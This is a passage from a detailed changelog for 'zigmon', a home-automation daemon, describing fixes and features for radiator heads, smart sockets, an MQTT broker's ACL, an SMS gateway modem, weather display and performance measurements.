a box answering HTTP can take only one at a time; over MQTT there is no such
queue, so a strip driven that way goes out in one breath — **1.6 ms from the
first command to the last, where it had been 63**.

3.17.0 — the broker's ACL can be mended from here. **Add them for me** on the
card, or `zigmon --acl mend`, puts exactly the missing lines into each user's
own block — nothing else in the file is touched, since it is the broker's own
and full of things this daemon knows nothing about: other users, other
topics, the order somebody chose, their comments. A copy of the file as it
stands is kept beside it first, the result is read back and checked, and if
the check fails the copy goes back. Then mosquitto is sent a HUP, which makes
it read the file again without dropping a single client — a restart would
drop them all.

`zigmon --acl` prints the same table the card shows, for when the dashboard is
not to hand.

3.16.2 — and I had gone too far the other way. Judging a shut room by the
head's mode was right, but not knowing the mode counted as *off*, so a head
that had not spoken since the house started was left alone whatever anybody
did to it. Not knowing counts as not off now: the head is switched off again,
once, and said so in words that match what was done — *"Topeni-Obyvak was
switched on by hand and Obyvak is off — switching it off again"* rather than
talking about degrees, which is not what a shut room is set by.

3.16.1 — you were right to ask, and the answer explains yesterday's flood.

A room that is shut — *off*, or a window open — is shut by switching the head
off, not by sending it a low number. That is correct, and it is what happens:
your four heads are all reporting `system_mode: off`, doing exactly as they
were told. But the watch for a hand-turned knob was comparing the head's *set
point* against the five degrees the room nominally wants, and a head that is
off keeps reporting whatever number it last held — thirty, in two of your
rooms. So it read as drift, every time, for ever. A shut room is judged by the
head's mode now: off is right, whatever number it is showing.

A room that wants heat is unaffected — a head turned by hand there is still
put back, and still put into manual first so that the head's own programme
does not fight it.

3.16.0 — two faults you caught, both mine.

**A head that would not listen was told for ever.** Told at once means told at
once, but the head answers with what it is still set to, and that answer was
taken as fresh news that it had been turned by hand — so the house told it
again, and again, several times a second. A head is a battery device and that
is how one is flattened in an evening. The same head is now told no oftener
than `heating_enforce_gap_s` (two minutes), at most
`heating_enforce_tries` times (three), and then the house says once that it
will not take the value and leaves it alone until the head says otherwise. Put
right by hand, or accepted by the head, the counting starts afresh. Nothing is
sent to a head that is already where it should be — that was true before and
is still true; what you were watching was one head refusing, over and over.

**Quiet after was being overruled.** Setting it to five hours still brought an
alert after one, because a built-in expectation per kind of device — a
thermometer speaks within the hour — won over it. Those are guesses about
devices; *quiet after* is what somebody actually asked for. The longer of the
two wins now: a kind may ask for more patience than the house, never for less.
The setting says as much in its own words, rather than the bare *Quiet warn*
that read like the only thing governing it.

3.15.4 — a proper look for anything that could be making it slow, and nothing
found that needs fixing.

The work done for every message that arrives is **nine to fourteen
microseconds**, the watch on a radiator head a single microsecond, and waking
the page a tenth of a millisecond. Nothing on the half-minute beat touches
the network — the four things that do are each put on a thread of their own.
The store's lock is never held while anything slow happens, and the write
queue never grew past nought.

Ninety seconds of storm in three windows showed no drift: 2.7, 2.9 and 2.9 ms
median, and the thread count and memory the same at the end as at the start.
Three strips fired at once sent twelve commands in **0.06 s**, each box in
its own order; one scene fired forty times over sent all hundred and sixty
and came back to seven threads.

Quiet, a report reaches the page in **1.5 ms**.

3.15.3 — and it was slower, as you said. Keeping a strip in order, I had it
wait for each socket to answer before starting the next, which turns one round
trip into four: a four-socket strip took **0.66 s where it had taken 0.21**,
and worse on a box further away. What has to be in order is the sending — the
box acts on the commands as they arrive — not the finishing. One worker starts
them in order, twenty milliseconds apart, and they fly at once. Back to
**0.21 s**, and still in order.

The guard in `test/replay.py` was measuring the wrong thing too: it watched
which socket *finished* first, which parallel sending makes meaningless. It
now notes the moment each command is handed over, with the last of the strip
answering fastest — exactly what used to shuffle the order.

3.15.2 — you were right, and I am sorry: keeping a strip's sockets in order
broke the scenes it was not thinking about. The sockets were gathered into a
list and sent after the loop had finished — but a step with a delay of its own
runs long after that loop, so its sockets went into a list nobody read again
and were never switched at all. Each batch now sends its own, so a step with a
delay works as it always did; and steps that share a delay are one batch, so
four sockets told to go in a second go in the order they are written rather
than racing from four threads.

`test/replay.py` now runs four shapes of scene — a strip alone, a lone socket
beside a strip, a step with its own delay, four steps sharing one — and
refuses a release where any of them switches the wrong things or switches
them out of order.

3.15.1 — an access point was listed under *The SMS gateway*. It had been
given the modem's own mark — set once with the rest of the icons, then
quietly set again to the modem's a hundred lines further down — and the lists
group by the mark, so the two ended up under one heading. An access point has
a mark of its own now, a globe, told apart at a glance from the Zigbee
router's dish and the modem's bars, and it has its own heading: **Wi-Fi**.

3.15.0 — putting a hand-turned head back could only be asked for in whole
minutes, and was off unless somebody had thought to set it. It is a choice
now, in words: **leave it**, **put it back as soon as the head says
otherwise**, or after five, fifteen, thirty or sixty minutes.

*As soon as* means what it says. The half-minute round was the only thing
watching before, so a knob turned by hand could stand for the best part of a
minute; a head's own report is now the moment — when it says it is set to
something the room did not ask for, and the room is not on manual, the room's
wish goes back there and then. Nothing else on the head wakes it: a battery
reading or a temperature passes without a word.

A room set to **manual** is untouched by any of this, as it always was: that
is what manual is for.

3.14.0 — the help was sixty lines aligned by hand, so a command longer than
its neighbours ran into their column and eleven of them had nothing said about
them at all. It is a table of pairs now — the command, and what it does — laid
out at the moment it is printed: one column for every description, set by the
lines that fit rather than by the longest, and a command past that column
keeps its words on the next line under the same margin. It follows the width
of the terminal, so a narrow window folds rather than spills.

Eleven examples were given words, and four that were missing were added:
`zigmon modem credit`, **`zigmon modem ussd '*123#'`**, `zigmon sms raw` and
`zigmon sms waiting`. Sixty-one in all, and `test/version.py` refuses a
release where one of them has nothing said about it.

3.13.3 — the target lists put anything they did not recognise under
*Sockets*, so yesterday's six new targets and the *answer only* line for a
text message all ended up among the plugs. Sorting them is now the same
question as naming them: **What the house does to itself** has its own
section at the foot of the list, beside *Automation on and off*, and **Just
an answer** has one at the head. The placeholder used to be dropped in above
the first heading with no heading of its own, which is what made it read as
belonging to whatever came next.

An access point was a *sensor*, since nothing said otherwise — it has its own
kind and its own section now, and sorts between the modem and the routers.

3.13.2 — the credit was read as whatever number came first in the operator's
message, which is as likely to be a phone number or a date as a balance. A
figure has to look like money now: standing beside a currency, or written
after a word like *kredit* or *balance*, or carrying decimals — and never a
number followed by GB, MB or a per cent sign, which is a data allowance
talking. `sms_credit_pattern` takes a pattern of your own for an operator
that words it some other way.

**`zigmon modem ussd '*123#'`** sends any code and prints what comes back in
full, wrapped to the terminal, saying underneath what it read as money and
whether anything was recorded. `zigmon modem credit` still uses the code from
the settings.

3.13.1 — a check over the whole of it for faults and for slowness, and one
thing worth guarding against.

Under a storm — six motion sensors, eight thermometers and three buttons all
reporting twelve times a second, two pages polling and searching, an editor
saving in a loop — the daemon rose to four hundred and sixty-five threads
before settling back to thirteen. Nothing broke and nothing was lost, but a
remote with a stuck button can ask for work faster than the work finishes,
and the answer to that should not be threads until it falls over. Past two
hundred pieces of work in hand a scene is dropped, said once a minute in the
log and written down in the events. Asked four hundred times with each socket
taking two seconds, two hundred were done and two hundred refused, and the
thread count held.

Timings on the tenth of September's database: quiet, a report reaches the
page in **1.4 ms** with a worst case of 4.9; under that whole storm, 5.3 ms
with a worst case of 42. Twenty hot paths measured, none over four
milliseconds except the modem status, whose thirty-one are a refused
connection to a gateway that is not there — the honest cost of asking.

3.13.0 — the four sockets of one strip in one scene clicked in a different
order every time, and now and then one answered so late it read as a flicker.
Each socket was going off on a thread of its own and all four then queued for
the same box; a Python lock hands itself to whichever thread happens to be
woken, not to whichever waited longest, so the head start each was given
counted for nothing. The sockets on one box are done by one worker now, in
the order they are written, each after the last has gone — and
`test/replay.py` runs a four-way strip three times over, with the last socket
answering fastest to tempt the race, and refuses a release that comes out in
any other order.

**A button can now tell the house what to do with itself.** Six new targets:
hush every alert for an hour or overnight, clear the standing alerts, ask
every socket and the modem where they stand, take a backup, send the daily
summary. A hushed house still writes everything down; it simply says nothing
until the time is up. They sit in every target list beside the sockets and
the scenes, so a rule, a schedule, a text message or a button by the door can
all reach them.

3.12.0 — two things an action could not say, and ten things a message could
not ask.

**On for a while.** `for:10m`, `for:30m`, `for:2h` and `off-for:30m` switch
now and switch back after — a cellar light, a fan, a pump, a socket muted for
half an hour. Every editor offers them and a text message takes them, so the
same words work wherever an action is written. It is not the old *pulse*,
which is a blink measured in milliseconds.

**A nudge from where it is now.** `step:+1`, `step:-0.5` and their kin read
what a settable target is at and set it that much higher or lower — a degree
warmer than whatever the plan says, without knowing what the plan says. If
there is nothing to nudge from, it says so and leaves it alone.

**Ten more facts**, about the house rather than one device: `{power_now}`
what everything is drawing, `{plugs_on}` and `{plugs_on_list}`,
`{coldest_room}` and `{warmest_room}`, `{rooms_heating}`, `{devices_quiet}`,
`{uptime}`, `{version}` and `{credit}`. A hundred and three now, every one
offered in the picker and filled by the daemon.

3.11.2 — a pass over the whole of it. One thing found: three readings were
described twice in the table of names and units — *pressure*, *window
detection* and *away mode* — and since Python keeps the last of two, the
earlier description was dead text that could be edited to no effect. The
duplicates are gone, and **`test/tables.py`** now refuses a release where a
hand-kept table says the same thing twice, or a class defines the same method
twice.

Everything else came back clean: every setting the daemon reads is offered
and every one offered is read, nothing written to the database goes unread,
no name on the page goes unserved, no id used without being made, no icon
named that does not exist, and all twelve editors refused four kinds of
nonsense each with the rules, scenes, rooms and people untouched. Quiet, a
report reaches the page in 1.5 ms.

3.11.1 — the credit was being asked for and kept, but never shown: it sits on
the gateway's card now, beside the signal and the data. How often to ask is a
list rather than a number — never, every six hours, twice a day, once a day,
once a week — and both it and the code moved up beside the other message
settings, out of *rarely needed*. On a contract SIM, leave the code empty and
nothing is ever asked.

3.11.0 — four things a text can now do.

**A command may take what follows it.** Switch on *takes a value* and
*heating 22* sets twenty-two degrees, *heating eco* sets eco — one command
instead of one per number. A number becomes `set:22`, a word the house knows
(on, off, comfort, eco, night, plan, manual) becomes that, and anything else
gets a short reply saying so rather than doing something unintended.

**A text can ask about a thing.** *Temp-Venek*, *temp loznice*, *Plug-UPS* —
the name of a room, a socket or a device, and it answers: *"Loznice: 23.3 °C
wants 20.0 not heating"*, *"Plug-UPS is on, 145 W"*. It looks for what is
called exactly that first, and only then for what the words are part of, so a
sensor called *Temp* does not answer every question with the word temp in it.

**help** replies with what the house understands, and it is what an
unrecognised text gets back too.

**The credit on a prepaid SIM.** `sms_credit_code` (`*101#` on most Czech
networks) is sent to the network with the API's own USSD call, on a button or
every so many hours; the answer arrives as the operator wrote it, is kept, and
the number in it becomes a reading — so a chart shows the credit going down
and a rule can watch it. `zigmon modem credit` asks from the command line.

3.10.2 — a walk over every control on the Control page, section by section:
thirteen cards in System and eighteen elsewhere, some fifteen hundred boxes,
lists and switches between them. Each was asked whether it has a label, is
the right kind of thing, carries a mark where its neighbours do, and shows
its words in full. One fault: the **Setup…** button on a person's card, which
gives the link for their phone's shortcut, was the only button in Control
without a mark; it has the link icon now. The forty-three lists that came
back empty are the action pickers on rows pointed at a notification — hidden,
as they should be, and none of them visible to anybody.

3.10.1 — yesterday's three roads were the house's only: a device that already
had its own notification override could say *what* was worth saying but not
*which way* to say it, and the code that read the override was looking for
something the page never wrote. Each device now has a second picker beside
its own — *by whatever the house uses*, *push only, no text*, *push and a
text*, *a text only*, *ntfy only*, *Telegram only* — and what it says wins
over the house. A freezer that must reach a phone in the night can have the
text while nothing else does.

3.10.0 — an audit of where every alert goes, and two things wrong with it.

**A written message** has had three switches of its own since 3.0.0 —
ntfy, Telegram, SMS, and who by text. **The ones the daemon writes itself** —
a battery running down, a device gone quiet, a rule firing, a socket that
will not answer, the daily summary — had none: they went down every road
that was configured, and once a gateway existed that included a text. They
have the same three switches now, under Notifications, and **a text is off
unless it is asked for**, since it costs money and wakes a phone at night. A
device that already has its own notification override can carry its own
choice of roads too.

**The forecast was being watched for going quiet.** The watchdog is for
sensors with batteries and radios, and it had been left to consider anything
that was not a socket — so the weather card, the modem card and a sensor
group could all be reported as having fallen silent, which is how a text
saying *Outside has gone quiet* came to arrive. None of them is watched now;
each says elsewhere when it cannot be reached.

3.9.3 — the blue frame round a settings box was not the pointer or the
cursor: it is the mark for a setting whose saved value differs from what
config.json says, which is what *weather_place* had become the moment it was
typed in. It looked exactly like a focused box, so it read as something stuck.
It is a blue edge down the left side and a dot beside the label now, which
cannot be mistaken for either, and the note above says so in those words.

3.9.2 — a pass over the tenth of September's database (1.73 million samples,
63 devices, 24 rules, integrity clean) and over what more than one thread
touches at once.

The database holds nothing it should not. What looked at first like a fault —
a motion rule firing eight hundred times to switch a light off and never once
to switch it on — is the configuration saying so: two of those *on* rules are
switched off, and a third only fires in the dark. No duplicated rows, no
row written twice for one moment, the roll-up doing its work.

One real fault in the sweep for races: the list of messages already dealt
with was trimmed by sorting the keys and keeping the last two hundred, which
keeps the ones whose slot number sorts highest rather than the ones that came
last — so on a busy line the wrong ones were forgotten and a message could be
acted on twice. It keeps them in the order they arrived now. Everything else
that several threads touch is either behind a lock or a deque, which is safe
by nature.

Measured on that database, with a storm of messages, two pages polling and
searching, an editor saving in a loop and the history being charted all at
once: a report reaches the page in **4.1 ms**, and quiet, **1.4 ms with a
worst case of 2.4**. A motion sensor whose rules fire takes 4.1 ms, a button
2.3 ms, a thermometer 1.4 ms. Nothing failed, nothing was lost, and the
write queue never grew.

3.9.1 — the sweep in 3.9.0 covered the Settings card; this one covers the
rest. Every control on every tab was walked — five and a half thousand of
them, eighty-two of which are settings — and two disagreed with what the
daemon says: the word the modem must send with a forwarded message was shown
on screen rather than hidden, and how often to look for messages was a list on
one card and a number everywhere else. Both agree now, and the numbers people
type phone numbers into ask for a keypad rather than a keyboard.
`test/inputs.py` refuses a release where the page draws a different kind of
box from the one the daemon declares.

3.9.0 — a walk through every box on the page, asking of each whether it is
the right kind of box.

The Settings card kept its own hand-written list of which settings were
yes-or-no questions, and the list had fallen behind: **weather** and
**preheat** were drawn as number boxes wanting a 1 or a 0. The daemon says
what kind each setting is now — a switch, a number, a decimal, words, a
clock, a password, or a fixed set — and the page draws what it is told, so a
setting added tomorrow gets the right box without anyone remembering to say
so. All fifty-seven shown were checked against what the daemon says, and all
fifty-seven agree.

**digest_at** is a clock rather than four characters to mistype, the four
settings with a fixed set of answers are lists, and the four that hold a
secret are not shown on screen. In the editors, the second and third
condition of a rule take a number the way the first always did, a phone
number asks for a phone keypad, and a picture's address asks for an address.

3.8.1 — a place could not be typed into the box asking for one. The Settings
page guessed what kind of box each setting wanted from the look of its name —
anything not obviously words got a number box — so *weather_place* and
anything else added since would take digits and nothing else. The daemon says
what kind each one is now, since it is the one that checks them, and the page
puts up what it is told: words, a number, a decimal, a time or a password.

3.8.0 — the gateway and its modem are words of their own, the way `shelly`
and `gateway` already were: **`zigmon sms`** and **`zigmon modem`**, each
with its own `--help` listing what can be asked for and half a dozen worked
examples. `--sms` and `--modem` still work, so nothing written down
elsewhere breaks.

The main `--help` gained the two, and a short list of the things worth asking
when something is not behaving — what would happen, why a socket is not
answering, which batteries are sinking. On a terminal the commands are picked
out in colour from the words about them, and piped anywhere else it is plain
text as before.

3.7.0 — the forecast card said one number. It says the sky now: **🌦️ light
rain**, **☀️ clear**, **🌙 clear** at night — the picture follows the hour, so
the same clear sky is a sun by day and a moon after dark — with what it feels
like, the humidity, the pressure, the cloud, the wind and where it is from,
the rain falling now and the rain expected today, the warmest and coldest of
the day, the sunrise and the sunset, and the next twenty-four hours' high and
low. Twenty-eight weather codes are given words and a picture; anything else
is honest about not knowing.

**weather_place** puts the name of the place under the card's own name — the
reading still follows `latitude` and `longitude`, so the words are only what
to call it. Every figure is a reading like any other, so History charts the
pressure falling and a rule can watch for rain.

3.6.1 — **Data received** and **Data sent** moved to the front of the
gateway's card, where the signal and the network are, since on a SIM that is
usually the number one wants. They can be started again from zero: the modem
counts from the moment it connected and cannot be told otherwise, so the
counting is done from a mark of our own — **Data counters back to zero** on
the card, or `zigmon --modem reset`. What the modem itself has carried stays
beside them as *Received since it connected*, and a modem that has restarted
moves the mark rather than showing a negative.

3.6.0 — everything the modem's own status page shows, read the same way, and
a command to read it with.

Fourteen more readings joined the gateway's card: the provider and how it is
registered, the network type as the modem words it, the bandwidth, whether
carrier aggregation is up, the signal quality as a percentage, the physical
cell and EARFCN, how many SIM slots there are and which is active, the
country and network codes taken from the IMSI — the first five digits, since
the rest identifies a subscriber and has no business in a database — the eSIM
profile, how many MIMO antennas, and whether the modem is busy. The per-band
table comes from `/modems/signal/status`, so a 4G carrier's own RSSI, RSRP,
RSRQ and SINR are read per band rather than as one figure.

**`zigmon --modem`** prints the lot, grouped as the modem's own page groups
it — SIM card, connection, signal, cell, the modem, traffic — and the band
table underneath. `--modem sim`, `signal`, `cell`, `data`, `info` and `bands`
print one part each.

3.5.0 — thirteen more facts, all about the text that arrived and whoever sent
it. A message could say what the number was but not whose it is, so
`{person}` now works in an answer wherever `{sms_from}` does, alongside
`{person_known}`, `{person_home}`, `{person_since}`, `{person_device}`,
`{person_may_command}` and `{person_gets_alerts}`. The text itself gained
`{sms_phrase}` — the words it was matched on — and **`{sms_rest}`**, which is
everything that followed them, so *heating 22* can set a temperature rather
than needing a command per number; with `{sms_first_word}`, `{sms_words}`,
`{sms_length}` and `{sms_number}` beside them. They are worked out in one
place, so an answer, an event and anything the command fires all see the
same thing. Ninety-eight facts now, and `test/facts.py` still says every one
of them is both offered and filled.

3.4.4 — say *home* and then *away* and the house sometimes let you in again a
moment later, running the arrival twice. A claim of being home was honoured
against the controller for half an hour, and a claim of being out was not
honoured at all: it was left to the ordinary rules, where the arrival's own
grace window — *seen a moment ago, so still home* — outlived it and put the
person back. The two are symmetrical now: somebody who has said they are out
stays out until the controller actually sees them again, at which point the
old word is spent and the network has the say, exactly as before. Saying
*away* while still on the Wi-Fi is still refused, as it was. `test/replay.py`
walks the whole sequence and refuses a release that arrives twice.

3.4.3 — the message lists on the command line wrote a moment as `09-10 18:01`,
which says neither the year nor the second and reads back to front for anyone
here. They write `10.09.2026 18:01:12`. `--sms raw` gained a *when* column of
its own, turning the modem's own `Wed Sep 10 18:01:12 2026` into the same
shape, and a heading over the columns.

3.4.2 — leaving was there all along, but nobody could see it. A person as a
target read *Falco being home* and offered *on*, *off* and *toggle*, so
saying "I am out" meant working out that it was *off*. The target reads
*Falco — home or away* now, and its actions are **has arrived**, **has left**
and **the other way round**. Nothing changed underneath: a rule or a text
written before still means what it meant.

3.4.1 — a notification is not switched on, so nothing pointed at one should
offer an action. Rules, bindings, schedules, scenes and presence triggers
already replaced the *Do* column with *sends the message*; the SMS commands
did not, and nor did a step in a sequence. Both do now. And the check for
"is this a notification" had never been told about the roads added in 3.0.0,
so *notify me — text only* and *text Falco* still asked for an action
everywhere; it knows them now. The bin on an SMS command sat off centre,
since a command button keeps room for a label it does not have; it is a
34-pixel square with the icon in the middle of it.

3.4.0 — send the same word twice and the second went missing. The modem
numbers messages by the slot they sit in and gives the slot back when one is
deleted; the second *On* landed in the slot the first had just left, from the
same number and with the same words, and what the daemon remembers about
messages already dealt with matched it exactly — so it was passed over as one
already seen, while the modem still held it. Two things now keep them apart:
the time the message arrived goes into what is remembered, and a message
taken off the modem is forgotten, since nothing can offer it again. Both are
in `test/replay.py`: the same text sent twice must be acted on twice.

3.3.9 — a text arrived, the events said *did "on"*, the answer went back, and
the light did not move. A target has to be worked out before it can be fired —
a name on a card becomes a socket, a group becomes its members — and the SMS
command was handing the name straight to the part that fires, which quietly
did nothing with it. It is worked out first now, and if the target turns out
to be switched off or gone, the events say so instead of claiming success.
The dashboard's own call had the same fault for a scene, a sequence or an
action group; it is fixed too, and `test/replay.py` now sends itself a text
and refuses the release unless something actually switches.

3.3.8 — the bin on an SMS command was the width of a name field. The answer
box spans the whole row, and it was being put in before the last two cells,
which pushed them onto a row of their own where the bin took a column meant
for a phrase and stretched across it. The answer goes in last, where it
belongs, and the bin keeps its own 34 pixels at the end of the row.

3.3.7 — three on the SMS card. The folds stopped opening after any change and
would not work again until the page was reloaded: the card refuses to rebuild
itself while there are unsaved changes, so as not to throw away half-typed
text, and the fold was asking for a rebuild; it opens and closes itself now,
which changes nothing but what is on show. The blue highlight over a person's
row was chopped into four because an outline was being drawn round every
cell — a leftover from when every editable row on the page was given a hover
outline; the row gets it now. And the switches lost the box 3.3.6 put round
them; the word beside them stays.

3.3.6 — the switches on the SMS card were the right size all along; what was
wrong is that they floated bare in a band while every field beside them sat
in a bordered box, so the eye read them as the wrong shape. Each now sits in
a box of the same height, edge and corner as its neighbours, with the word
*on* or *off* next to it, and the whole box is the thing you click.

3.3.5 — two more on that card. The row under the pointer was lit by giving
each of its four cells the same background, and the joins showed; a row is a
row of its own now, sharing one column template with the heading, so the
highlight is a single band the whole way across. And the two boxes for
numbers that belong to nobody sat at different heights, because their labels
are of different lengths and they were the only pair on the card not sharing
the three bands the rest do; they share them now.

3.3.4 — the SMS card's switches were the small ones, which beside a
full-height box read as a dot rather than a switch. They are the same
44 by 26 as every other switch on the page.

3.3.3 — the whole Settings card had gone wrong, not only the SMS one. The
three-band rule written for the SMS settings in 3.2.1 was applied to every
settings grid on the page, and in a grid a box keeps its own width and sits
where it likes; so every label and every box in Settings, Wi-Fi and Heating
drifted to the right of its column. The rule applies to the SMS card alone
now and says what fills its one column; everywhere else an item is a label
over a box, hard left, the box the full width of its column, the way it was.

3.3.2 — all thirty-five readings were being kept, but a card shows the four
that matter most and the modem's card was showing three of them. It shows
eight: the signal, the network and band, the operator, the SIM, whether it is
connected, how many messages are sitting in it, and how many went out today.
The other twenty-seven are where every device's are — the readings popup on
the card, the All values tab, and History.

3.3.1 — the people table's cells kept a rounded corner each, so the row under
the pointer lit up as four boxes with the blue cut between them; the cells
carry no rounding, border or background of their own now and the row is one
band. And half the settings were saying the same words twice — the grey text
in the empty box and the note under it were the same sentence, which read as
a stutter. A note that only repeats its own box is left out, though the band
it would sit in is kept, so the boxes stay level down the row.

3.3.0 — the gateway's card was showing eight of the thirty-five things the
modem says about itself. It says them all now: the four signal figures and
Ec/Io, RSCP and the quality percentage beside them; the operator, the
provider, whether it is registered and with whom; the band, the cell, the
area and tracking codes; the SIM's state, which SIM is active, the last four
of its number, whether a PIN is set and how many tries are left; VoLTE, the
external aerial, the modem's own firmware and temperature, the message
centre; the bytes each way since it connected; and what the house itself has
done — sent and received today, how many are waiting to go, how many are
sitting in the modem's inbox, and how many commands it is listening for.

Each is a reading like any other, so History charts the signal against the
day, a rule can watch the band changing or the temperature climbing, and an
alert can quote any of it.

3.2.1 — yesterday's regrouping read badly. Three things were wrong with it.
A setting with a note under it sat lower than its neighbours, because each
item was a column of its own and only its own contents decided where the box
went; the items share three bands now — label, control, note — so a two-line
label no longer drags its own box below the others, and every item keeps its
third band even when it has nothing to say. A dropdown cannot wrap, so the
long explanations that were inside the choices are under them instead, and
the choices themselves are short enough to read. And the people table drew a
box around every cell, which came out as a row of separate boxes with gaps
between them; it is one table now, with a line between rows, a heading band,
and rounded corners only where the table itself ends.

3.2.0 — the SMS gateway's settings were thirty boxes in one heap, several of
them asking to be typed a word into and answering only to three. They are
five folds now, in the order somebody setting one up meets them: **the
gateway itself** and **messages in and out** open, and **instant delivery**,
**when things go wrong** and **rarely needed** folded away, since a working
TRB140 wants nothing from the last three. Anything with a fixed set of
answers is a list rather than a box — which interface, how often to look,
what to do about a stranger's text, where to ask the modem about itself, how
to write a number — each choice saying what it means rather than naming a
value. The two boxes for numbers that belong to nobody moved down beside the
people they add to, where the confusion about how they combine was.

3.1.9 — the time sat across the message on the SMS tab. When the settings
table was given a name of its own in 2.99.4, the rename caught a line it had
no business with, and the sender's cell on this tab became a four-column
table: the name and the time were laid out side by side and the time ran into
the bubble. The name stands over the time again.

3.1.8 — a text from a number nobody knows was being forwarded to the house's
own phone, at the house's own expense. The daemon says so when a stranger
writes, which is right; what was wrong is that saying so went out by every
road including SMS, so an operator's notice or a bank's code arrived twice —
once from the operator, once from the house. It is said through ntfy and
Telegram now and not by text. `sms_stranger_alert` chooses: `event` (only
written down), `notify` (the default), or `sms` for anyone who does want it
forwarded.

An alert about a message will also never be texted to the number the message
came from, whatever the settings say — that was one wrong tick away from two
phones texting each other all night.

3.1.7 — three things about incoming messages.

**The wait.** The inbox was looked at on the heating's half-minute, so a
setting of every fifteen seconds still waited thirty, and sixty could take
ninety. It keeps its own rhythm now, on its own thread, and the default is
fifteen seconds. For a message that arrives the instant it is sent, give
`sms_push_secret` a word and paste the address into the modem's *SMS
forwarding to HTTP*.

**A message taken for an old one.** The device numbers messages by storage
slot and gives the slot back when one is deleted, so message 2 could be a new
message in an old number's clothing and be passed over. What is remembered is
the slot, the sender and the opening of the text together.

**Half a message.** The command line cut every text at sixty-odd characters,
which is a third of an SMS. `--sms inbox`, `--sms outbox` and `--sms raw`
print the whole thing, wrapped under itself to the width of the terminal.

3.1.6 — the messages still did not show. Yesterday's fix wrote down the ones
found on a first look, but by then they had already been marked as seen by
the run before, so the poll passed over them without a word — and would have
for ever. A message the device lists is written down if the log does not
already hold it, whether or not it is to be acted on; the device's own id is
kept beside it so it is written once and no more.

And the words were misleading, as you said. **`--sms inbox`** is now what
came in and **`--sms outbox`** what went out — the two halves of the
conversation. What has not managed to go yet is **`--sms waiting`**, and what
the device itself is holding is **`--sms raw`**. `--sms all` shows both
directions together.

3.1.5 — the two messages the daemon found and left alone never reached the
SMS tab: what came in was written to the log inside the part that acts on a
message, and the leave-it-alone path returned before that. They are kept and
shown now, marked *was already here*, so the tab shows the whole
conversation while still not carrying out yesterday's texts.

3.1.4 — messages went out but none ever came in. The listing was filtered to
messages the device called *unread*, and a TRB marks a message read the
moment it stores it — so the filter threw away every one. Every message the
device lists is taken now; what stops one being acted on twice is the list of
ones already seen, which outlives a restart, and taking them off the device
afterwards. Whatever was already sitting in the inbox the first time the
daemon looks is remembered and left alone, with an event saying how many, so
an upgrade does not carry out a week of old texts.

Two more: `zigmon --sms inbox` asked for a path that does not exist, and
there was no way to see what the device itself says. **`zigmon --sms raw`**
prints the device's own listing — id, sender, status, text — so *"it says it
has none"* can be told apart from *"we are throwing them away"*, and it
points at the SMS storage setting when the list really is empty.

3.1.3 — *Gets alerts* and *May command* could not be saved: the save used
`people-save`, which is the id of a button on another page, not the path the
relay serves — so it answered *unknown endpoint* and the two ticks never
went anywhere. It uses `people` now. `test/endpoints.py` gained a check that
every name the page calls is one the relay actually serves, since that is the
whole shape of this mistake; it says how many it checked (ninety-one today)
and refuses a release where one is missing.

3.1.2 — `zigmon --check-sms` walks the whole road to the gateway and says,
step by step, what is well and what is not: the settings, whether the device
answers and lets us in, the SIM, the signal, whether the modem is registered,
who would be told, who may command, whether there is anything a text may do,
whether incoming messages would be noticed at all, and whether anything is
stuck in the outbox. Whatever fails is turned into a line saying what to do
about it — a wrong password, a locked SIM, an aerial that wants moving.

It also found a fault of its own: four of the seven ways the daemon talks to
the gateway — the whole older interface and the bus — were opening plain
connections and ignoring the certificate setting, so any of them over HTTPS
(which RutOS now enforces) would have failed. Every request goes through one
door now.

3.1.1 — a walk through the SMS settings, asking of each whether it earns its
place. `sms_delete_path` was read by nothing at all, and behind it was a real
fault: a message that had been acted on was never taken off the device, and
the list of ones already seen lived only in memory — so a restart would carry
out every command still sitting in the inbox, again. They are removed now
(`/messages/actions/remove_messages`, or the cgi path for the older
interface), and the ones seen are kept in the database. `sms_clear_inbox`
turns that off for anyone who would rather keep them on the modem.

`sms_status_via: auto` used to try a bus a TRB140 does not run, costing a
timeout on every poll; auto now means *the same interface as everything
else*. And three settings the daemon reads were never shown on the page —
the modem's name among the devices, and the status and delete paths for the
older interface — while `sms_number_format` now says plainly that it applies
to that interface only, since the device's own API always wants `+420…`.
Twenty-nine settings, every one of them offered and every one of them read.

3.1.0 — the SMS gateway is rewritten against the TRB140's own API
description, because what was there could not have worked on a device in its
factory state. Five things were wrong. It defaulted to the older *Post/Get*
query interface, which is switched off until somebody turns it on under
Services — a new device answers only the REST API, so that is the default
now. Sending left out **modem**, which is required even when the device has
one, and the device answered with a bare complaint; the modem is asked for
once and remembered, or named in the settings. Numbers went out as
`00420...`, while the API insists on `+420...`. The inbox was read from
`/api/messages`, which does not exist — it is `/api/messages/status`, and
messages already marked read are passed over. And the token was kept for
twenty-five minutes when the device gives five, so everything worked once
and then quietly stopped; it is renewed a minute before it lapses and a
refusal makes it log in again. HTTPS with the device's self-signed
certificate is accepted unless `sms_verify_cert` says otherwise.

The modem's readings now come from the fields the device actually uses —
signal, operator, network, SIM state, cell, its own temperature and the bytes
each way — with RSRP, RSRQ and SINR from `/api/modems/signal/status`.

`test/mocksms.py` speaks that API too, with the same rules enforced, so the
whole path can be tried without a SIM card. Doing so turned up one more
thing: on a database that had been sitting a while, the quiet-device watchdog
sent twenty-two texts at once. More than `quiet_at_once` (three) going quiet
together is now one message that names them — a dozen at once is a radio or a
broker, not a dozen flat batteries.

3.0.3 — eighteenth pass, on the ninth of September's database. One figure
stood out: the battery health walks a month of history for every cell that
has one, 20 to 26 ms, and the page asks for it every five minutes; the answer
is kept for those five minutes now, so a second look costs nothing. Nothing
else was over eight milliseconds. Twenty-one hot paths were timed, every read
the page can make was tried (none failed, none over 60 ms), and all twelve
editors were handed four kinds of nonsense each — a string, a number, an
object and nothing at all — and refused every one of them with the rules,
bindings, scenes, rooms and messages left exactly as they were. Under a
storm of a hundred and ten messages a second with two pages polling and
searching, a report still reaches the page in 3.8 ms; quiet, it is 1.5 ms
with a worst case of 3.0.

3.0.2 — the box times were still large because the fix that was meant to cure
them had never once run. Asking a box for a reading of all its sockets can
fail, and when it did the daemon quietly asked each socket on its own
instead — which is exactly the old behaviour, and nothing said so. It says so
now, once per box, and the test gateway that was refusing those readings
(mine, not yours) is mended, so the saving can be measured: a round over four
sockets on one box went from **eleven seconds to four, and to nothing at all
once the box has been learnt** — one request where there were four.

*Where the time goes* now separates the two halves of a slow poll: the figure
is the box's own answer, and any wait in the queue is written beside it as
*(+950 ms in the queue)*. A large number there is our own pacing; a large
number in front of it is the box.

